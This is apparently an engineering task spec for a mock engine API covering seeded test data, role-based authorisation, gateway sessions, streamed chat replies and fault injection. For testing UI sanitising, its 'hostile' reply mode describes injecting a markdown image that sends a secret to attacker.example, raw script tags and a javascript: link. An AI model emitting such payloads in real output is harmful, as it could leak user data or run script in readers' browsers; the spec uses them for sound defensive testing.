# M-04. Mock engine API: seeded data, scenarios, roles, fault injection, streaming

- **Lane:** Mock engine · **Module:** `apps/mock-engine` · **Milestone:** M2
- **Depends on:** C-04, M-02 · **Unblocks:** C-05 (and the engine-ui e2e flows via M-05, X-04)
- **Status:** todo
- **Spec:** Security hardening (1, 5, 7, 8); Engine security baseline; Enterprise-ready engine architecture; What our platform can and cannot do; ADRs: [0004](../../adr/0004-mock-engine-and-conformance.md), [0005](../../adr/0005-modular-architecture.md)

## Goal

The mock engine serves the full engine API contract from `@ptbk/engine-api` (C-04) on its in-tunnel HTTP server, with believable, deterministic data for an organisation with several members and roles, a simulated gateway session, per-endpoint authorisation, streamed chat replies and switchable faults.

## Context

engine-ui (U-*) is built against this server, and the conformance suite (C-05) is first proven against it, so its behaviour is the executable spec for the real engine. It must have no shortcuts the real engine would not have (ADR 0004). The architecture is multi-user from day one: every row carries an org ID, members have roles, and nothing assumes a single owner.

## Scope

- `src/domain/state/engine-state.ts`: in-memory state for one org: members (with roles), agents, chats and messages, secrets (name, scope, last use; values stored but never returned), settings, security panel data, audit log. Every entity has `orgId`. Mutations go through functions that validate with C-04 schemas and append audit entries.
- `src/domain/state/seed.ts`: `seedEngineState({ seed, scenario, epoch }, deps)` using `@faker-js/faker` 10.x (`new Faker`, `faker.seed(seed)`, `setDefaultRefDate(epoch)`). IDs come from a seeded `Random`, never `crypto.randomUUID`. Same seed, scenario and epoch give byte-identical state.
- `src/domain/state/scenarios.ts`: `empty` (owner only, no agents), `small-team` (owner, admin, two members, one viewer; about 8 agents with chat history, a few secrets), `large-fleet` (about 500 agents, about 40 members across all roles, long chat histories for pagination). Roles are C-04's role set (expected: owner, admin, member, viewer).
- `src/domain/authorization/authorizer.ts`: port `Authorizer { authorize(actor: Actor, permission: Permission, resource: ResourceRef): AuthorizationDecision }` with `AuthorizationDecision = { kind: 'allow' } | { kind: 'deny'; reason }`. `src/domain/authorization/policy.ts`: the one policy module, deny by default, mapping roles to permissions and checking resource ownership (for example, a member edits only agents they own). Permissions come from C-04 if it declares them per operation; otherwise a route-to-permission table lives here and a test fails if any contract operation lacks an entry.
- `src/domain/gateway/session-store.ts`: server-side sessions, 128-bit IDs from `Random`, idle and absolute timeouts from `Clock`, revoke one or all, new ID on sign-in, step-up freshness timestamp.
- `src/domain/chat/reply-generator.ts`: deterministic per seed, chat and message index. Produces believable markdown: paragraphs, lists, tables, fenced code blocks (TypeScript, bash, JSON) and links. A `hostile` mode (an agent seeded in `small-team` called e.g. "Injection demo") adds an external image `![x](https://attacker.example/?d=secret)`, raw `<script>`, a `javascript:` link and an over-long line, so engine-ui sanitising is testable (Security hardening 5).
- `src/domain/faults/fault-plan.ts`: strict zod `FaultPlan` { `latencyMs: { min, max }`, `errorRate` (0–1), `errorStatus` (500 | 502 | 503), `dropStreamRate` (cut SSE or WebSocket mid-stream), `slowTunnelBytesPerS`, optional `routes` glob filter }.
- `src/adapters/http/gateway-middleware.ts`: anonymous API requests get 401 problem+json; anonymous document requests get the sign-in page. State-changing requests require same-origin `Origin` and `Sec-Fetch-Site` of `same-origin` or `none`, else 403 before anything else runs. Cookie `__Host-ptbk_session`, `Secure`, `HttpOnly`, `SameSite=Strict`, `Path=/`.
- `src/adapters/http/dev-login.ts`: the mock sign-in page (open-engine style, no inline script or style) lists seeded members by display name and role; choosing one POSTs a form and creates a session for that member. Enabled only when `MOCK_DEV_LOGIN=enabled`. A matching dev step-up form marks the session freshly asserted for 5 minutes.
- `src/adapters/http/api-routes.ts`: Hono routes for every C-04 operation, request and response validated with C-04 schemas, each calling `Authorizer` before touching state. Denials return 403 problem+json (RFC 9457) in C-04's error shape. Sensitive operations C-04 marks as step-up return C-04's step-up error without fresh assertion. `Cache-Control: no-store` on all API responses.
- Chat streaming: SSE per C-04, token by token (word and punctuation tokens, default 30 per second with seeded jitter). Client disconnect stops generation; the message is stored as complete or interrupted per the contract.
- `src/adapters/http/fault-middleware.ts` and a tunnel-level throttle on M-01 duplexes for `slowTunnelBytesPerS`.
- `src/adapters/control-server.ts`: `/__mock/*` on a separate plain-HTTP listener at `MOCK_CONTROL_HOST:MOCK_CONTROL_PORT` (default `127.0.0.1:4480`), started only with `MOCK_CONTROL=enabled`, never mounted on the in-tunnel server. Routes: `GET /__mock/state` (summary counts), `POST /__mock/reset` `{ scenario, seed }`, `PUT /__mock/faults` (a `FaultPlan`), `DELETE /__mock/faults`, `GET /__mock/members` (IDs and roles, for tests). All bodies strict zod.
- Config: `MOCK_SEED` (default 1), `MOCK_SCENARIO` (default `small-team`), `MOCK_SEED_EPOCH` (default `2026-10-01T00:00:00Z`), `MOCK_FAULTS` (JSON `FaultPlan`), `MOCK_DEV_LOGIN`, `MOCK_CONTROL`, `MOCK_CONTROL_HOST`, `MOCK_CONTROL_PORT`. Startup fails if `NODE_ENV=production` and `MOCK_CONTROL` or `MOCK_DEV_LOGIN` is enabled.

## Out of scope

- Real WebAuthn (see open points). UI loader and security headers (M-05). Heartbeat values (M-06 reads counts from this state through a port).

## Design notes

- Audit entries record actor member ID and role, action, target ID and time from `Clock`, hash-chained (SHA-256 of previous hash plus entry, through a `Sha256` port).
- Secrets are write-only: no response schema ever contains a value. Assert it with a test that scans every response.
- Faker runs only at seed time; request handling uses the seeded `Random`, so runs stay reproducible.

## Acceptance criteria

- [ ] Seed snapshot test: `small-team`, seed 42, fixed epoch produces a stable hash; a different seed changes it; `large-fleet` seeds in under 2 s.
- [ ] Contract test: every C-04 operation has a handler and a permission; every response in the test run validates against C-04's response schema.
- [ ] Authorisation matrix test: for each role and each operation, the result matches the policy table; a member gets 403 problem+json on another member's private agent; a viewer gets 403 on every mutation; a revoked session gets 401 on the next request.
- [ ] Mutations reflect in reads (create, rename, delete an agent; replace a secret updates last-changed, never returns the value); each mutation adds an audit entry with the actor, and the chain verifies.
- [ ] Gateway tests: cross-site POST gets 403; missing cookie gets 401; idle timeout expires a session with the fake clock.
- [ ] Streaming test: a chat reply arrives as SSE tokens, contains a code block, and is identical for the same seed; disconnect stops generation.
- [ ] Fault tests: latency within bounds, error rate within tolerance over 1,000 seeded requests, dropped stream mid-SSE, runtime change through `/__mock/faults` takes effect on the next request.
- [ ] Through the tunnel, `/__mock/*` returns 404 even with `MOCK_CONTROL=enabled`.
- [ ] `bun run check` passes.
- [ ] **Status** line above set to `done (#<PR>)`.

## Risks and open points

- Dev login replaces passkeys. If engine-ui's passkey management and step-up flows need truthful testing, the mock could run real WebAuthn with `@simplewebauthn/server` and Playwright's virtual authenticator instead. Decide with U-06 and X-04 owners.
- If C-04 does not define the role set, per-operation permissions or the step-up error, raise it on C-04 rather than inventing them here; the local table is a stopgap.
